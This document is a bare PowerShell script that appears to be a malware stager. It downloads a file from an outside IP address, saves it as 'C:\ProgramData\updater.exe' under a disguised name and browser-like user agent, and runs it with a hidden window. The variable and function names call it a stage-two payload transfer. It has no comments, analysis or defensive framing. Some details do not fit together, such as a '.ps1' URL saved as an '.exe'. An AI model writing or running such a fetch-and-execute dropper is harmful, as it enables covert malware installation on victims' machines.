[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://192.0.2.96:8443/stage1.ps1',
    [string]$OutputPath = 'C:\ProgramData\updater.exe',
    [int]$ConnectionTimeout = 30,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Get-Stage2Payload -SourceUrl $Stage1Url -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
    if ($TransferResult) {
        Start-Process -FilePath $OutputPath -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ProgressPreference = "SilentlyContinue"
